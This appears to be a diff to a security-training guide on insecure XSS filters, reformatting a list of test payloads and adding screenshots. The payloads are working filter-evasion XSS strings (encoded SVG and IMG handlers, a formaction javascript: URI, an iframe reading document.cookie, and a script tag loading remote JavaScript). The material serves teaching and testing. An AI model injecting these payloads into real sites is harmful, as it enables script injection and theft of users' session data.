@@ -79,29 +79,40 @@ An insecure XSS filter occurs when an application fails to properly validate use
      Example: `<img src="x" onerror="alert('XSS')">` might bypass filters if `onerror=` is not blacklisted correctly
    - Obfuscation Techniques:
      Using techniques such as breaking keywords (e.g., `java + script:`) to bypass string-based filters
-4. To test the vulnerability, use the following payloads
-   SVG element with onload event handler
-   ```
-   <svg ONLOAD="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
-   ```
-   IMG onerror and JavaScript Alert Encode
-   ```
-   <img SRC=x ONERROR="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
-   ```
-   Basic XSS Test Without Filter Evasion
-   ```
-   <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
-   ```
-   URL string evasion
-   ```
-   <A HREF="http://www.google.com./">XSS</A>
-   ```
-   Trigger JavaScript execution using formaction
-   ```
-   <form><button formaction=JAVASCRIPT&colon;ALERT(1)>CLICKME
-   ```
-   Iframe event based mayhem
-   ```
-   <IFRAME SRC=# ONMOUSEOVER="ALERT(DOCUMENT.COOKIE)"></IFRAME>
-   ```
-5. For validation purposes, ensure that the injected JavaScript successfully executes on the frontend (e.g., showing an alert box) and different bypass techniques successfully trigger the XSS, demonstrating the insecure filter
+4. To test the vulnerability, use the following payloads and ensure that the injected JavaScript successfully executes on the frontend (e.g., showing an alert box) and different bypass techniques successfully trigger the XSS
+   - SVG element with onload event handler
+     ```
+     <svg ONLOAD="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
+     ```
+     ![image](https://github.com/user-attachments/assets/4d0326ff-3b2d-455d-8f7e-649674a17fbe)
+
+   - IMG onerror and JavaScript Alert Encode
+     ```
+      <img SRC=x ONERROR="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+     ```
+     ![image](https://github.com/user-attachments/assets/addbf297-5b8a-46fb-ad76-1ff1e18890a7)
+
+   - Basic XSS Test Without Filter Evasion
+     ```
+     <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
+     ```
+     ![image](https://github.com/user-attachments/assets/cc3768ef-2b63-4be5-9c4b-f5f57daae5f5)
+
+   - URL string evasion
+     ```
+     <A HREF="http://www.google.com./">XSS</A>
+     ```
+     ![image](https://github.com/user-attachments/assets/b4c7d151-c097-4746-b0b0-e2d91e55041a)
+
+   - Trigger JavaScript execution using formaction
+     ```
+     <form><button formaction=JAVASCRIPT&colon;ALERT(1)>CLICKME
+     ```
+     ![image](https://github.com/user-attachments/assets/38dace16-5342-41c3-887d-03e5bbaf30f2)
+
+   - Iframe event based mayhem
+     ```
+     <IFRAME SRC=# ONMOUSEOVER="ALERT(DOCUMENT.COOKIE)"></IFRAME>
+     ```
+     ![image](https://github.com/user-attachments/assets/57778a91-0fd0-4c16-a9ff-c2af05156e60) 
+
